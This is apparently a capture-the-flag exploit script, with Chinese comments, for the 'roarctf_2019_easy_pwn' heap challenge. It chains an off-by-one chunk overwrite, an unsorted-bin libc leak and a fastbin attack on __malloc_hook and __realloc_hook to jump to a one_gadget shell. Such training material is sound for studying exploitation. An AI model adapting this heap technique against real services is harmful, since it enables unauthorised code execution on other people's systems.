# -*- coding: utf-8 -*-
from PwnContext.core import *
binary = './roarctf_2019_easy_pwn'
debug_libc = './libc-2.23.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 0
if local == 1 :
    r = remote('node3.buuoj.cn','26208')
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    r = ctx.start()


def add(size):
    r.recvuntil("choice: ")
    r.sendline(str(1))
    r.recvuntil("size: ")
    r.sendline(str(size))

def edit(index,size,content):
    r.recvuntil("choice: ")
    r.sendline(str(2))
    r.recvuntil("index: ")
    r.sendline(str(index))
    r.recvuntil("size: ")
    r.sendline(str(size))
    r.recvuntil("content: ")
    r.sendline(content)

def free(index):
    r.recvuntil("choice: ")
    r.sendline(str(3))
    r.recvuntil("index: ")
    r.sendline(str(index))

def show(index):
    r.recvuntil("choice: ")
    r.sendline(str(4))
    r.recvuntil("index: ")
    r.sendline(str(index))


add(0x68)#0
add(0x68)#1
add(0x68)#2
add(0x68)#3
add(0x68)#4
add(0x68)#5
payload = 'a'*0x68+p8(0xe1)   #x64大于128进入unsortbin ，e1刚好等于0x70*2
edit(0,0x68+0xa,payload)
free(1)
add(0x68)#1  gdb.attach(r)
show(2)     # 常规的 unsortbin 切割
r.recvuntil(": ")
leak = u64(r.recv(6).ljust(8,'\x00'))
libc = leak - 0x3c4b78
print "libc:"+hex(libc)
free_hook = libc +0x3c67a8
malloc_hook = libc +0x3c4b10
ong_a = libc + 0x4526a
realloc_hook = libc +0x846C0
payload = p64(malloc_hook -0x23)
add(0x60)#6  从未使用完的unsortbin中分配，覆盖了原来2的0x71大小(0x60分配本身也是0x71
free(2)
edit(6,8,payload)  #
add(0x60)#2  第一次分配先把 刚刚的free(2)使用了。分配出去之后会清空fd
add(0x60)#7  类似uaf了，利用fd去分配, 当然借助的是malloc__周围的一个0x7f作为size
payload = 'a'*0xb+p64(ong_a)+p64(realloc_hook)
edit(7,len(payload),payload)
gdb.attach(r)
add(0x68)
r.interactive()

# 特别注意：此处使用calloc ，应该将__realloc_hook写为onegadget，然后将__malloc_hook写为__realloc_hook
# __realloc_hook 就在__malloc_hook 前面。各占八个字节(x64)
#  calloc在分配完内存后，自动初始化该内存空间为零，而malloc不初始化，里边数据是旧数据
